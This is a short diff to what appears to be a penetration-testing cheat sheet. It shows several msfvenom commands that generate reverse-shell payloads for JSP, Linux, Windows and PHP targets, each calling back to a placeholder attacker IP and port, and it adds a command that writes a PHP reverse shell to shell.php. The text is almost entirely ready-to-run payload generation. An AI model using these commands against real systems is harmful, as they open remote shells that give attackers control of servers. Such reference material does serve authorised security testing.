@@ -2127,6 +2127,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f raw 
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Linux x64
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Linux x86
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Windows
+
+# create php reverse shell
+msfvenom -p php/reverse_php LHOST=attacker_IP LPORT=port_here -o shell.php
 ```
 
 
